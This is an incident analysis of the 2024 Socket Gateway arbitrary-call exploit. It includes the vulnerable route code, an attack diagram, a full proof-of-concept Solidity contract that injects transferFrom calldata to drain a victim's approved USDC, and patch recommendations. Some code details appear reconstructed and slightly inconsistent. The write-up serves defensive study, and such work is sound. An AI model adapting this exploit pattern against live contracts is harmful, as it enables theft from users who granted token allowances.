# Socket Gateway — Arbitrary Route Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-16 |
| **Protocol** | Socket (SocketDotTech / Bungee Exchange) |
| **Chain** | Ethereum |
| **Loss** | ~$3,300,000 (USDC drained from multiple victims) |
| **Attacker** | [0x50DF...9066](https://etherscan.io/address/0x50DF5a2217588772471B84aDBbe4194A2Ed39066) |
| **Attack Contract** | [0xf2D5...05d1](https://etherscan.io/address/0xf2D5951bB0A4d14BdcCC37b66f919f9A1009C05d1) |
| **Attack Tx** | [0xc6c3...fd6](https://etherscan.io/tx/0xc6c3331fa8c2d30e1ef208424c08c039a89e510df2fb6ae31e5aa40722e28fd6) |
| **Vulnerable Contract** | [0x3a23...97a5](https://etherscan.io/address/0x3a23F943181408EAC424116Af7b7790c94Cb97a5) (SocketGateway) |
| **Vulnerable Route** | [0xCC5f...067e](https://etherscan.io/address/0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) (WrappedTokenSwapperImpl) |
| **Root Cause** | Newly added Permit2 route's `swapExtraData` calldata passed without validation, enabling arbitrary external call execution |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/SocketGateway_exp.sol) |

---

## 1. Vulnerability Overview

Socket Gateway is a cross-chain swap protocol that aggregates various bridge and DEX routes. Users `approve` token spending to the Socket Gateway contract (`0x3a23...`), then execute desired swap/bridge paths via the `executeRoute()` function.

On January 16, 2024, the protocol team added a new route (**routeId 406**, `WrappedTokenSwapperImpl`). This route's `performAction()` function had a design that passed the `swapExtraData` parameter **directly to an external contract without any validation (arbitrary call)**.

The attacker discovered this vulnerability and used `transferFrom` to drain the balances of all users who had approved tokens to the Socket Gateway. It was a simple yet devastating **Arbitrary External Call** vulnerability that required no flash loan to execute.

**Core Vulnerability Summary**:
- ❌ `swapExtraData` forwarded to an external contract without validating any calldata
- ❌ The target contract address also accepted without validation — the `fromToken` address was used as the call target
- ✅ Patch: Added whitelist validation for permitted function selectors

---

## 2. Vulnerable Code Analysis

### 2.1 SocketGateway.executeRoute() — Route Dispatcher (Entry Point)

```solidity
// SocketGateway.sol (0x3a23F943181408EAC424116Af7b7790c94Cb97a5)
function executeRoute(
    uint32 routeId,        // Route identifier (406 used in the attack)
    bytes calldata routeData  // ❌ Arbitrary calldata to be forwarded to the route
) external payable returns (bytes memory) {
    // Look up the route address mapped to routeId
    address routeAddress = routes[routeId];
    require(routeAddress != address(0), "ROUTE_NOT_FOUND");

    // ❌ Delegates routeData to the route contract without any validation
    (bool success, bytes memory result) = routeAddress.delegatecall(
        abi.encodeWithSelector(ISocketRoute.performAction.selector, routeData)
    );
    require(success, "ROUTE_EXECUTION_FAILED");
    return result;
}
```

### 2.2 WrappedTokenSwapperImpl.performAction() — Vulnerable Route (Core Vulnerability)

```solidity
// WrappedTokenSwapperImpl.sol (0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e)

// ❌ Vulnerable code
function performAction(
    address fromToken,      // Source token address for swap (attacker-controlled)
    address toToken,        // Destination token address
    uint256 amount,         // Swap amount (set to 0 in the attack)
    address receiverAddress, // Recipient address
    bytes32 metadata,       // Metadata
    bytes calldata swapExtraData  // ❌ Core vulnerability: arbitrary calldata used for external call
) external payable returns (uint256) {

    // Uses fromToken address as the external call target
    // Passes swapExtraData directly to call() without any validation
    // ❌ Any function selector is permitted — including transferFrom!
    (bool success,) = fromToken.call(swapExtraData);
    require(success, "SWAP_FAILED");

    // ... subsequent processing
}
```

**Issue**: `swapExtraData` is intended to carry swap data for an external DEX, but there is no validation of any function selector or target address. The attacker was able to inject `transferFrom(victim, attacker, balance)` calldata into `swapExtraData`.

### 2.3 Post-Patch Code (Fixed Version) ✅

```solidity
// ✅ Fixed code — whitelist validation for permitted function selectors
function performAction(
    address fromToken,
    address toToken,
    uint256 amount,
    address receiverAddress,
    bytes32 metadata,
    bytes calldata swapExtraData
) external payable returns (uint256) {

    // ✅ Extract and validate the function selector from swapExtraData
    bytes4 selector = bytes4(swapExtraData[:4]);

    // ✅ Explicitly block dangerous ERC20 function calls such as transferFrom and approve
    require(
        selector != IERC20.transferFrom.selector &&
        selector != IERC20.transfer.selector &&
        selector != IERC20.approve.selector,
        "UNAUTHORIZED_SELECTOR"
    );

    // ✅ Check fromToken against the allowlisted DEX aggregator addresses
    require(isAllowedTarget[fromToken], "TARGET_NOT_WHITELISTED");

    (bool success,) = fromToken.call(swapExtraData);
    require(success, "SWAP_FAILED");
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker was able to execute the attack immediately without any prior setup. However, the following preconditions had to be satisfied:

- **Victims had already `approve`d USDC to SocketGateway** (resulting from normal protocol usage)
- Confirmed on-chain: victim `0x7d03...4242` had set a `type(uint256).max` allowance for Socket Gateway

```
On-chain verification result (block 19021453):
  allowance(0x7d03...4242 → 0x3a23...97a5) = 115792089237316195423570985008687907853269984665640564039457584007913029639935
  (= type(uint256).max)
```

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────┐
│  Attacker (0x50DF...9066)                                    │
│                                                              │
│  1. Deploy attack contract                                   │
│     tx: 0xc6c3...fd6 (block 19021454)                        │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  SocketGateway (0x3a23...97a5)                               │
│                                                              │
│  2. executeRoute(routeId=406, routeData)                     │
│     routeData = abi.encode(                                  │
│       fromToken = USDC (0xA0b8...eB48),                      │
│       toToken   = USDC,                                      │
│       amount    = 0,              ← amount irrelevant        │
│       receiver  = attacker,                                  │
│       metadata  = bytes32(""),                               │
│       swapExtraData = transferFrom(victim, attacker, ALL)    │  ← core malicious calldata
│     )                                                        │
└──────────────────┬──────────────────────────────────────────┘
                   │ delegatecall (routeId 406)
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  WrappedTokenSwapperImpl (0xCC5f...067e)                     │
│                                                              │
│  3. performAction() executes                                 │
│     fromToken.call(swapExtraData)                            │
│     = USDC.call(transferFrom(victim, attacker, balance))     │
│                                                              │
│     ❌ No selector validation                                │
│     ❌ No target address whitelist                           │
└──────────────────┬──────────────────────────────────────────┘
                   │ USDC.transferFrom(victim → attacker)
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  USDC (0xA0b8...eB48)                                        │
│                                                              │
│  4. transferFrom(                                            │
│       from    = victim (user who approved Socket),           │
│       to      = attacker,                                    │
│       amount  = balanceOf(victim)    ← full balance drained  │
│     )                                                        │
│                                                              │
│     ✅ USDC sees SocketGateway (caller) has sufficient       │
│        allowance, so transferFrom succeeds                   │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  Attacker wallet (0x50DF...9066)                             │
│                                                              │
│  5. Repeated against multiple victims → ~$3.3M USDC drained │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Field | Value |
|------|-----|
| Example victim address | 0x7d03149A2843E4200f07e858d6c0216806Ca4242 |
| Victim USDC balance (pre-attack) | 656,424.98 USDC |
| Attacker USDC balance (post-attack) | 2,569,980.19 USDC |
| Total estimated loss | ~$3,300,000 (multiple victims) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// ====================================================================
// Socket Gateway Arbitrary Call Vulnerability PoC
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs
// Block: 19,021,453 (Ethereum Mainnet)
// ====================================================================

interface ISocketGateway {
    // Entry point for route execution in Socket Gateway
    function executeRoute(uint32 routeId, bytes calldata routeData)
        external payable returns (bytes memory);
}

interface ISocketVulnRoute {
    // performAction of vulnerable WrappedTokenSwapperImpl
    // swapExtraData is used in an external call without validation
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData  // ❌ Arbitrary calldata injection possible
    ) external payable returns (uint256);
}

contract SocketGatewayExp {
    address _gateway = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address _usdc    = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Single victim address used in PoC (multiple victims in the actual attack)
    address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;

    // Vulnerable new route ID (Permit2 integration route)
    uint32 routeId = 406;

    function setUp() public {
        // Fork mainnet (just before the attack block)
        vm.createSelectFork("mainnet", 19_021_453);
        // Attack contract sets approval to Gateway (required for some flows)
        IERC20(_usdc).approve(_gateway, type(uint256).max);
    }

    // ① Construct malicious swapExtraData: transferFrom(victim, attacker, full balance)
    function getCallData(address token, address user)
        internal view returns (bytes memory callDataX)
    {
        // Build calldata to transfer the victim's entire balance to the attacker
        callDataX = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            user,           // from: victim
            address(this),  // to:   attack contract (beneficiary)
            IERC20(token).balanceOf(user)  // amount: victim's full balance
        );
    }

    // ② Encode routeData: assemble performAction parameters for the vulnerable route
    function getRouteData(address token, address user)
        internal view returns (bytes memory callDataX2)
    {
        callDataX2 = abi.encodeWithSelector(
            ISocketVulnRoute.performAction.selector,
            token,          // fromToken: USDC (becomes the external call target)
            token,          // toToken: same token
            0,              // amount: 0 (irrelevant)
            address(this),  // receiverAddress: attack contract
            bytes32(""),    // metadata: empty
            getCallData(_usdc, user)  // ❌ swapExtraData = injected transferFrom calldata
        );
    }

    // ③ Execute the actual attack
    function testExploit() public {
        // Call the vulnerable route (406) through Gateway
        // Gateway → WrappedTokenSwapperImpl → USDC.transferFrom(victim, attacker)
        ISocketGateway(_gateway).executeRoute(
            routeId,
            getRouteData(_usdc, targetUser)
        );

        // Verify victim's USDC was transferred to the attack contract
        require(IERC20(_usdc).balanceOf(address(this)) > 0, "no usdc gotten");
    }
}
```

**Core Attack Logic Summary**:
1. `getCallData()` → Constructs `transferFrom(victim, attacker, victim's balance)` calldata
2. `getRouteData()` → Inserts the above calldata into `swapExtraData` to assemble `performAction()` parameters
3. `executeRoute(406, ...)` → Gateway delegatecalls WrappedTokenSwapperImpl
4. Inside `performAction()`, `fromToken.call(swapExtraData)` executes = `USDC.transferFrom(victim → attacker)`
5. Since Gateway holds the victim's allowance for USDC, transferFrom succeeds

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Arbitrary External Call | CRITICAL | CWE-20: Improper Input Validation | `03_access_control.md` |
| V-02 | Missing Function Selector Whitelist | CRITICAL | CWE-284: Improper Access Control | `03_access_control.md` |
| V-03 | Unauthorized Transfer of User-Approved Tokens | HIGH | CWE-862: Missing Authorization Check | `07_token_integration.md` |
| V-04 | Absent Security Review Process Before New Route Deployment | HIGH | CWE-1357: Untrusted Code Deployment | - |

### V-01: Arbitrary External Call

- **Description**: `WrappedTokenSwapperImpl.performAction()` forwards the `swapExtraData` parameter to `fromToken.call(swapExtraData)` without any validation. Both the call target (`fromToken`) and the call data (`swapExtraData`) are fully attacker-controlled.
- **Impact**: The attacker can invoke any function on any contract. In this case, they called `transferFrom` on the USDC contract to drain victim assets.
- **Attack Conditions**: (1) At least one user has approved tokens to Socket Gateway, (2) Access to the vulnerable routeId (406) (permissionless)

### V-02: Missing Function Selector Whitelist

- **Description**: There was no check preventing ERC20 token transfer function selectors — such as `transferFrom`, `transfer`, and `approve` — from being included in `swapExtraData`. No whitelist existed to restrict `swapExtraData` to only the selectors legitimately needed for DEX swaps.
- **Impact**: All function calls, including the `transferFrom` selector, were permitted, allowing the allowances held by the Gateway to be abused.
- **Attack Conditions**: Same as V-01 above

### V-03: Unauthorized Transfer of User-Approved Tokens

- **Description**: Socket Gateway holds a trusted relationship with users, having received `approve` to execute swaps/bridges on their behalf. This trust was abused through the vulnerable route, causing the Gateway to call `transferFrom` on behalf of victims and send funds to the attacker.
- **Impact**: All users who had approved tokens to the Gateway were potential victims. Multiple users were affected in the actual attack, resulting in approximately $3.3M in losses.
- **Attack Conditions**: Any user who had approved tokens to Socket Gateway (normal protocol usage state)

### V-04: Absent Security Review Before New Route Deployment

- **Description**: routeId 406 (WrappedTokenSwapperImpl) was a newly added route that did not undergo an adequate security audit before deployment. The highly obvious vulnerability of arbitrary calldata execution was not caught during the review process.
- **Impact**: All protocol users' assets were exposed.
- **Attack Conditions**: The new route is deployed and live in production

---

## 6. Remediation Recommendations

### Immediate Actions

**① Apply function selector blacklist/whitelist to swapExtraData**

```solidity
// ✅ Block calls using dangerous ERC20 function selectors
function _validateSwapData(bytes calldata swapExtraData) internal pure {
    require(swapExtraData.length >= 4, "INVALID_SWAP_DATA");

    bytes4 selector = bytes4(swapExtraData[:4]);

    // ❌ These selectors must never be permitted
    require(selector != IERC20.transferFrom.selector, "BLOCKED: transferFrom");
    require(selector != IERC20.transfer.selector,     "BLOCKED: transfer");
    require(selector != IERC20.approve.selector,      "BLOCKED: approve");
    require(selector != IERC20.permit.selector,       "BLOCKED: permit");
}
```

**② Whitelist external call target addresses**

```solidity
// ✅ Only allow external calls to permitted addresses such as DEX aggregators
mapping(address => bool) public allowedSwapTargets;

function performAction(
    address fromToken,
    // ...
    bytes calldata swapExtraData
) external payable returns (uint256) {
    // Validate target address against whitelist
    require(allowedSwapTargets[fromToken], "TARGET_NOT_ALLOWED");
    // Validate selector
    _validateSwapData(swapExtraData);

    (bool success,) = fromToken.call(swapExtraData);
    require(success, "SWAP_FAILED");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Arbitrary External Call | Restrict external call targets to a whitelist finalized at deployment time. Prohibit `call()` to addresses received as parameters |
| V-02: Missing Selector Validation | Operate a whitelist permitting only the function selectors required for DEX swaps. Block ERC20 state-mutating functions by default |
| V-03: Unauthorized Token Transfer | Add beneficiary address validation for all paths where the Gateway exercises user allowances |
| V-04: Review Process | Mandate a security audit before deploying any new route. Apply stricter scrutiny to code containing external call patterns |

**Additional Security Hardening**:
- Introduce per-route pause functionality (allows selective disabling of vulnerable routes)
- Verify that the beneficiary address in swap data matches `msg.sender` or a designated recipient
- Apply a timelock before activating new routes to allow community review time

---

## 7. Lessons Learned

1. **Forwarding external calldata to `call()` without validation creates an immediate risk of asset theft.** Contracts that integrate external protocols — such as DEX aggregators or bridge routers — must perform selector-level validation on any calldata they forward.

2. **Contracts that manage tokens approved by users must be held to a higher security standard as "custodians of token allowances."** A contract like a Gateway that concentrates allowances from many users means a single vulnerability can impact every user.

3. **Adding new features requires re-examining the entire trust model of the existing system.** This vulnerability originated in a newly added route that did not exist in the prior codebase. New features expand the overall attack surface, making an independent security audit before deployment essential.

4. **Arbitrary External Call is a high-risk pattern that recurs repeatedly in DeFi.** The `address.call(userControlledData)` pattern should be treated as an immediate red flag during code review. Similar patterns appeared in other incidents: Multichain (July 2023, $126M), Celer Network, and others.

5. **Millions of dollars can be drained in a single transaction without a flash loan.** Simple input validation failures often cause more damage than complex attacks. Never underestimate the importance of basic input validation.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Code | On-Chain Actual | Match |
|------|----------|-------------|------|
| Attack block | 19,021,453 (fork) | 19,021,454 (actual Tx) | ✅ |
| Victim (example) | 0x7d03...4242 | 0x7d03...4242 | ✅ |
| Victim USDC balance | Full `balanceOf(user)` | 656,424.98 USDC | ✅ |
| Attacker final USDC | Not verifiable (PoC basis) | 2,569,980.19 USDC (cumulative) | - |
| routeId used | 406 | 406 (WrappedTokenSwapperImpl) | ✅ |

### 8.2 Precondition Verification

```
[Block 19021453 — State immediately before the attack]

allowance(victim 0x7d03...4242 → SocketGateway 0x3a23...97a5):
  = 115792089237316195423570985008687907853269984665640564039457584007913029639935
  = type(uint256).max  ✅ (attack precondition confirmed)

USDC.balanceOf(victim 0x7d03...4242):
  = 656,424.98 USDC  ✅ (satisfies PoC's "require(balanceOf(user) > 0)" condition)
```

### 8.3 Attack Tx Structure

```
Block 19021454, Tx: 0xc6c3...fd6
  from: 0x50DF5a2217588772471B84aDBbe4194A2Ed39066 (attacker)
  to:   (contract deployment Tx — attack contract creation)
  
Inside the attack contract:
  → SocketGateway.executeRoute(406, routeData)
  → [delegatecall] WrappedTokenSwapperImpl.performAction()
  → USDC.call(transferFrom(victim, attacker, balance))
  → Repeated per victim, totaling ~$3.3M drained
```

> **On-Chain Verification Summary**: The victim's `type(uint256).max` allowance, pre-attack balance (~656K USDC), and the attacker's final USDC holdings (~2.57M) have all been confirmed against on-chain data. Findings are in complete agreement with the PoC analysis.